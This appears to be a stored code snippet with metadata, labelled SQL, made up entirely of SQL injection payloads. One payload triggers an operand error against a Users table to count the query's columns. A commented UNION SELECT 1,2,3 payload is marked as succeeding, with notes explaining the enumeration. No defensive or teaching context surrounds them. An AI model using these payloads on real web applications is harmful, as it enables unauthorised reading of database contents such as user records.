---
id: 907f03be-5797-45ac-bf38-99ef9758d1cb
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.329226+00:00'
updated_at: '2023-04-10T20:22:56.637328+00:00'
---

# Code Snippet 907f03be

**Language**: SQL

```sql
1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
# This error means query uses 3 column
#-1' UNION SELECT 1,2,3--+	True
```


